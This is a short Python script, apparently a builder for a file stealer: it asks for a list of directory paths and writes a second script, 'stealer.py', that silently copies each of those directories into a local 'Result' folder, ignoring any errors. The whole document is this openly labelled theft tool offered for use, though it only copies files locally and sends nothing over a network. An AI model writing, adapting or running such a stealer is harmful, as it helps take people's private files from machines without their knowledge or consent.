listTarget = []; counter = 0
print("[*] Write the '\exit' if you want break the cicle")
while True:
	select = input("[%d] Directory: "%(counter))
	if select != '\\exit':
		listTarget.append(select)
		counter += 1
	else: break

with open("stealer.py",'w') as stealer:
	stealer.write('''
from os import getcwd, mkdir
from os.path import basename
from shutil import copytree

directory = getcwd()+"/Result/"
try:mkdir(directory)
except FileExistsError:pass

listTarget = ''' + str(listTarget) + '''

for target in listTarget:
	under = directory + basename(target)
	try:copytree(target, under)
	except:pass
''')
	print("[+] File 'stealer.py' created")